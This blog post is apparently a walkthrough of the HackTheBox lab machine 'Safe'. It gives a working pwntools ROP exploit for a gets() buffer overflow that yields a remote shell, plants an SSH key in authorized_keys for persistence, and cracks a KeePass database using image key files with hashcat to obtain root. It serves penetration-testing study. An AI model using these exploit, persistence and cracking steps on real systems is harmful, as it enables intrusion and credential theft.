---
layout: post
title: "safe"
date: 2025-09-30 
categories: OSCP Playlist
---
# safe

# Summary

- view page source to discover hidden app on port 1337 hosting binary
- download binary to reverse engineer
- used pwndbg and ropper to find rop and function addresses, to inject /bin/sh to .data and execute by jumping to system call
- keepass db file at home, along with a bunch of image files; transfer back to host
- create script to convert all image files as key file input to kdbx file in john hash format
- use hashcat -m 13400 to crack all hashes, password cracked along with the right image as the key file
- found root password in keepass db

# Attack Path

First enumerate the open ports and services:

```bash
sudo nmap -sC -sV -oN nmap/safe 10.10.10.147

22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u6 (protocol 2.0)
| ssh-hostkey: 
|   2048 6d:7c:81:3d:6a:3d:f9:5f:2e:1f:6a:97:e5:00:ba:de (RSA)
|   256 99:7e:1e:22:76:72:da:3c:c9:61:7d:74:d7:80:33:d2 (ECDSA)
|_  256 6a:6b:c3:8e:4b:28:f7:60:85:b1:62:ff:54:bc:d8:d6 (ED25519)
80/tcp open  http    Apache httpd 2.4.25 ((Debian))
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

We note an old version of ssh being used here.

Let’s visit the web page:

![image.png]({{ site.baseurl }}/assets/safe/image.png)

Default apache web page.

Let’s do fuzz for subdir:

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://10.10.10.147/FUZZ -ic
```

Nothing. Let’s do another port scan:

```bash
rustscan -a 10.10.10.147 --ulimit 50000

22/tcp   open  ssh     syn-ack ttl 63
80/tcp   open  http    syn-ack ttl 63
1337/tcp open  waste   syn-ack ttl 63
```

We see a new port. Let’s scan it with nmap:

```bash
sudo nmap -sC -sV -p 1337 -oN nmap/safe2 10.10.10.147

1337/tcp open  waste?
| fingerprint-strings:
|   DNSStatusRequestTCP:
|     06:56:05 up 11 min, 0 users, load average: 0.62, 0.35, 0.13
|   DNSVersionBindReqTCP:
|     06:56:00 up 11 min, 0 users, load average: 0.67, 0.36, 0.13
|   GenericLines:
|     06:55:48 up 11 min, 0 users, load average: 0.79, 0.37, 0.13
|     What do you want me to echo back?
|   GetRequest:
|     06:55:54 up 11 min, 0 users, load average: 0.73, 0.37, 0.13
|     What do you want me to echo back? GET / HTTP/1.0
|   HTTPOptions:
|     06:55:54 up 11 min, 0 users, load average: 0.73, 0.37, 0.13
|     What do you want me to echo back? OPTIONS / HTTP/1.0
|   Help:
|     06:56:10 up 11 min, 0 users, load average: 0.57, 0.35, 0.13
|     What do you want me to echo back? HELP
|   NULL:
|     06:55:48 up 11 min, 0 users, load average: 0.79, 0.37, 0.13
|   RPCCheck:
|     06:55:55 up 11 min, 0 users, load average: 0.73, 0.37, 0.13
|   RTSPRequest:
|     06:55:55 up 11 min, 0 users, load average: 0.73, 0.37, 0.13
|     What do you want me to echo back? OPTIONS / RTSP/1.0
|   SSLSessionReq, TLSSessionReq, TerminalServerCookie:
|     06:56:10 up 11 min, 0 users, load average: 0.57, 0.35, 0.13
|_    What do you want me to echo back?

```

Let’s interact it with nc:

```bash
nc 10.10.10.147 1337               
 07:01:33 up 17 min,  0 users,  load average: 0.00, 0.11, 0.08
hello

What do you want me to echo back? hello
```

It seems to be outputting our input back to us.

If this is echoing with the command echo, let’s try to break out of the command:

```bash
nc 10.10.10.147 1337
 07:04:23 up 20 min,  0 users,  load average: 0.00, 0.05, 0.06
helllo'; whoami

What do you want me to echo back? helllo'; whoami

 07:04:01 up 19 min,  0 users,  load average: 0.00, 0.06, 0.06
"whoami

What do you want me to echo back? "whoami

```

Does not work

Let’s try adding arguments:

```bash
nc 10.10.10.147 1337 hello
 07:06:50 up 22 min,  0 users,  load average: 0.00, 0.03, 0.05

What do you want me to echo back? 
invalid port hello

```

It seems to be looking for a port. Let’s try port 80:

```bash
 nc 10.10.10.147 1337 80   
 07:07:02 up 22 min,  0 users,  load average: 0.00, 0.03, 0.05

What do you want me to echo back? 
HTTP/1.1 400 Bad Request
Date: Sat, 27 Sep 2025 11:07:03 GMT
Server: Apache/2.4.25 (Debian)
Content-Length: 301
Connection: close
Content-Type: text/html; charset=iso-8859-1

<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>400 Bad Request</title>
</head><body>
<h1>Bad Request</h1>
<p>Your browser sent a request that this server could not understand.<br />
</p>
<hr>
<address>Apache/2.4.25 (Debian) Server at 127.0.1.1 Port 80</address>
</body></html>

```

Going back to the site, viewing the page source revealed something interesting:

```bash
<!-- 'myapp' can be downloaded to analyze from here
     its running on port 1337 -->
```

Let’s visit /myapp and download the file.

Using the file command on the file revealed to us that it’s an 64 bit ELF binary.

```bash
file myapp

myapp: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fcbd5450d23673e92c8b716200762ca7d282c73a, not stripped
```

Let’s decompile it with ghidra:

In the decompiler, we go to the main function, this is what the code does:

```bash
undefined8 main(void)

{
  char local_78 [112];
  
  system("/usr/bin/uptime");
  printf("\nWhat do you want me to echo back? ");
  gets(local_78);
  puts(local_78);
  return 0;
}
```

gets function is vulnerable to stack buffer overflow. We notice the buffer size is quite small. We also see that the program calls system first:, taking only one argument RDI, is /usr/bin/uptime.

![image.png]({{ site.baseurl }}/assets/safe/image%201.png)

Let’s perform a buffer overflow attack and return to the system call and execute a shell. 

One method to get a shell is by writing over .data. If we go to ghidra, on the function bar where all the function icons are situated e.g. where bar where the save button is, click on Display Memory Map icon (hover over icons to see what they are). Then we find .data section, and see the permissions for read and write are both ticked.

![image.png]({{ site.baseurl }}/assets/safe/image%202.png)

At a high level, this is our attack chain:

1. Overwrite saved RIP with `pop rdi; ret` gadget. Execution goes to that gadget.
2. Gadget executes: it pops the *next* QWORD off the stack into `rdi`. That next QWORD is `binsh` (0x404038). So now `rdi = 0x404038`.
3. The subsequent `ret` returns into `gets@plt`. So you execute `gets(0x404038)`.
    - `gets` will read from stdin until newline and write those bytes starting at `0x404038`. This is how you *place* `"/bin/sh"` into memory.
4. The process returns after `gets`. Now the next ROP frame on the stack is `pop rdi; ret` again.
5. That gadget runs and pops the next QWORD (again `binsh = 0x404038`) into `rdi`. So `rdi = 0x404038` — *now pointing to the string you just wrote there*.
6. The next ROP slot is `system@plt`. Return into it and it executes `system(0x404038)`. Since `0x404038` now contains `"/bin/sh\0"`, you get a shell.

```jsx
payload = junk + pop_rdi + binsh + plt_gets + pop_rdi + binsh + plt_system
```

We see that the buffer allocated here is 112 bytes. Let’s use pwndbg to debug the program

```jsx
chmod +x myapp
pwndbg myapp
set follow-fork-mode parent
```

We follow the main parent process.

We can get the address value in gdb or the decompiler, both points to system eventually:

```python
pwndbg> info functions
All defined functions:

Non-debugging symbols:
0x0000000000401000  _init
0x0000000000401030  puts@plt
0x0000000000401040  system@plt
0x0000000000401050  printf@plt
0x0000000000401060  gets@plt
0x0000000000401070  _start
0x00000000004010a0  _dl_relocate_static_pie
0x00000000004010b0  deregister_tm_clones
0x00000000004010e0  register_tm_clones
0x0000000000401120  __do_global_dtors_aux
0x0000000000401150  frame_dummy
0x0000000000401152  test
0x000000000040115f  main
0x00000000004011b0  __libc_csu_init
0x0000000000401210  __libc_csu_fini
0x0000000000401214  _fini
```

 Now, we can use cyclic to find the exact offset to RIP:

```jsx
cyclic 130

aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha
```

Now run the program in gdb and enter our payload

```jsx
run

Starting program: /home/kali/htb_labs/safe/myapp 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Detaching after vfork from child process 65620]
 12:14:49 up  2:10,  1 user,  load average: 0.01, 0.00, 0.00

What do you want me to echo back? aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha

```

Now check the registers, specifically the values overwritten in RSP:

```jsx
regs

 RBP  0x616161616161616f ('oaaaaaaa')
 RSP  0x7fffffffdb48 ◂— 'paaaaaaaqa'
 RIP  0x4011ac (main+77) ◂— ret 

```

Now we can copy the RSP values and use cyclic to find out the exact offset, only copy the first 8 bytes:

```jsx
cyclic -l paaaaaaa

Finding cyclic pattern of 8 bytes: b'paaaaaaa' (hex: 0x7061616161616161)
Found at offset 120
```

Now we know we need to overwrite 120 bytes to get to RIP. Now we can use ropper to identify a pop RDI function, so we can return to that address first and change the parameters of the call to system:

```jsx
ropper --file myapp --search "pop rdi"

[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: myapp
0x0000000000401090: pop rdi; adc dword ptr [rax], eax; call qword ptr [rip + 0x2f56]; hlt; nop dword ptr [rax + rax]; ret; 
0x000000000040120b: pop rdi; ret; 
```

We will use the address at 0x000000000040120b.

Now we have everything, let’s create our final payload:

```python
0x0000000000401060  gets@plt
0x0000000000401040  system@plt
0x000000000040120b: pop rdi; ret; 
0x404038 .data

plt_gets = p64(0x0000000000401060)
pop_rdi = p64(0x000000000040120b)
plt_system = p64(0x0000000000401040)
binsh = p64(0x404038)
junk = 'A' * 120

payload = junk + pop_rdi + binsh + plt_gets + pop_rdi + binsh + plt_system

```

Let’s write our exploit:

```python
from pwn import *

context(os="linux", arch="amd64")
#context(log_level='DEBUG')

junk = "A"*120

plt_gets = p64(0x401060)
plt_system = p64(0x401040)
pop_rdi = p64(0x40120b)
binsh = p64(0x404038)

payload = flat(junk, pop_rdi, binsh, plt_gets, pop_rdi, binsh, plt_system)

p = remote("10.10.10.147", 1337)
p.recvline()
p.sendline(payload)
p.sendline('/bin/sh\x00')
p.interactive()
```

Execute it:

```python
~/.local/share/pipx/venvs/pwntools/bin/python3 exploit.py
```

We now have shell:

![image.png]({{ site.baseurl }}/assets/safe/image%203.png)

We find a kdbx file in the user’s home dir. Let’s transfer the file back and attempt to password crack it. First we have to convert the file to john format to try and crack the master password:

```python
keepass2john MyPasswords.kdbx > mypassswords.hash
```

Now crack it:

```python
john --wordlists=/usr/share/wordlists/rockyou.txt mypasswords.hash
```

Looks like the password is not cracking. Let’s get a persistent shell on ssh:

```python
#Let's create a ssh key on attack host
ssh-keygen -f user
cat user.pub

ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIByAhumMzo4xVvApNJa3o+n+6lH/6kxyCeuOqix/RIdL kali@kali

#Now cat the content and echo it to authorized_keys on target host
mkdir .ssh
cd .ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIByAhumMzo4xVvApNJa3o+n+6lH/6kxyCeuOqix/RIdL kali@kali" >> authorized_keys

#Now we try to login:
chmod 600 user #change to secure permission to allow use of private key

ssh -i user user@10.10.10.147

```

We now have ssh access:

![image.png]({{ site.baseurl }}/assets/safe/image%204.png)

Let’s enumerate with linpeas:

```python
╔══════════╣ Sudo version                                  
sudo Not Found 

[+] [CVE-2019-13272] PTRACE_TRACEME

   Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=1903
   Exposure: probable
   Tags: ubuntu=16.04{kernel:4.15.0-*},ubuntu=18.04{kernel:4.15.0-*},[ debian=9 ]{kernel:4.9.0-*},debian=10{kernel:4.19
.0-*},fedora=30{kernel:5.0.9-*}
   Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/47133.zip
   ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2019-13272/poc.c

══╣ Active Ports (netstat)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:1337            0.0.0.0:*               LISTEN      -                       
tcp        0      0 0.0.0.0:5355            0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -                   
tcp6       0      0 :::5355                 :::*                    LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      - 

                               ╔═══════════════════╗
═══════════════════════════════╣ Users Information ╠═══════════════════════════════
                               ╚═══════════════════╝
╔══════════╣ My user                                       
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#users
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev
),112(bluetooth) 

╔══════════╣ Currently Logged in Users

══╣ Basic user information
 15:28:47 up 1 day, 54 min,  1 user,  load average: 0.24, 0.06, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
user     pts/1    10.10.16.9       15:26   31.00s  0.15s  0.00s /bin/sh ./linpeas.sh

══╣ Active sessions
 15:28:47 up 1 day, 54 min,  1 user,  load average: 0.24, 0.06, 0.02
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
user     pts/1    10.10.16.9       15:26   31.00s  0.15s  0.00s w

══╣ Logged in users (utmp)
           system boot  2025-09-29 14:34
           run-level 5  2025-09-29 14:34
LOGIN      tty1         2025-09-29 14:34              1303 id=tty1
user     + pts/1        2025-09-30 15:26   .          2967 (10.10.16.9)
```

Port 5355 seems unusual. Let’s check it out:

```python
ssh -i user user@10.10.10.147 -L 5355:localhost:5355
```

Let’s use nmap to scan it:

```python
nmap -sT -p 5355 localhost -sC -sV

PORT     STATE SERVICE VERSION
5355/tcp open  llmnr?

```

Nothing much here. 

We also find a bunch of images in the user’s home dir. Let’s transfer it to our attack host and take a closer look. First let’s put all the image files in a single directory. Then, use strings on it and see if any strings are embedded in the images:

```python
strings -n 8 *

%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz              
&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyz 
```

Let’s see if metadata reveal anything interesting:

```python
exiftool *
```

Nothing.

It turns out, keepass can be configured to use a file along with a password for unlocking access. Let’s turn all the image files into hashes with this simple bash script:

```python
for i in $(ls images);
	do 
		keepass2john -k images/$i MyPasswords.kdbx | sed "s/MyPasswords/$i/g" >> hashes;
	done
```

- s: Indicates a substitution operation.
- MyPasswords: The pattern to search for in the input text.
- $i: A shell variable (e.g., i) whose value will replace MyPasswords. The $i is expanded by the shell before sed processes it.
- /g: Performs the replacement globally (i.e., replaces all occurrences of MyPasswords in each line).

Now let’s crack it with hashcat

```python
.\hashcat.exe -m 13400 -0 ..\hashes.txt ..\rockyou.txt --user

$keepass$*2*60000*0*a9d7b3ab261d3d2bc18056e5052938006b72632366167bcb0b3b0ab7f272ab07*9a700a89b1eb5058134262b2481b571c8afccff1d63d80b409fa5b2568de4817*36079dc6106afe013411361e5022c4cb*f4e75e393490397f9a928a3b2d928771a09d9e6a750abd9ae4ab69f85f896858*78ad27a0ed11cddf7b3577714b2ee62cfa94e21677587f3204a2401fddce7a96*1*64*e949722c426b3604b5f2c9c2068c46540a5a2a1c557e66766bab5881f36d93c7:bullshit
```

We know the hash ending with 3c7 is our image. That’s IMG_0547.JPG. Let’s use this image and the password to unlock the keepass database:

```python
keepassxc-cli open --key-file IMG_0547.JPG MyPasswords.kdbx

ls

clip "Root password"
```

Now we have root’s password on the clipboard, let’s try switching user on the ssh session.

We are now root:

![image.png]({{ site.baseurl }}/assets/safe/image%205.png)